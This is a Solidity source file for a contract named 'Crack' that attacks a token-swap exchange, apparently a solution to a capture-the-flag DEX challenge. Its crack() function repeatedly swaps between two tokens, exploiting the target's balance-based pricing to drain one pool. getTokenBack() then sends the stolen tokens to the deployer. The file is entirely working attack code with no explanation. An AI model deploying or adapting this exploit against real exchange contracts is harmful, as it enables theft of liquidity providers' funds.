pragma solidity ^0.6.0;

interface Target {
    function swap(address from, address to, uint amount) external;
    function getSwapPrice(address from, address to, uint amount) external;
    function token1() external view returns (address);
    function token2() external view returns (address);
}

interface Token{
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract Crack {

    Target target;
    Token token1;
    Token token2;
    address owner;

    constructor(address _target) public {
        target = Target(_target);

        token1 = Token(target.token1());
        token2 = Token(target.token2());

        token1.approve(_target, uint(-1));
        token2.approve(_target, uint(-1));

        owner = msg.sender;
    }

    function calcAmount(Token from) internal view returns (uint) {
        uint fromBal = from.balanceOf(address(target));
        uint mybal = from.balanceOf(address(this));
        return fromBal > mybal ? mybal : fromBal;
    }

    function crack() external {
        for (uint i = 1; i < uint(-1); i++) {
            Token from = i % 2 == 0 ? token1: token2;
            Token to = i % 2 == 0 ? token2: token1;

            if (from.balanceOf(address(this)) == 0) {
                if (to.balanceOf(address(this)) == 0) {
                    break;
                }
                Token tmp = from;
                from = to;
                to = tmp;
            }

            target.swap(address(from), address(to), calcAmount(from));

            if (to.balanceOf(address(target)) == 0) {
                break;
            }
        }
    }

    function getTokenBack() external {
        require(msg.sender == owner, "not owner");

        token1.transfer(owner, token1.balanceOf(address(this)));
        token2.transfer(owner, token2.balanceOf(address(this)));
    }

}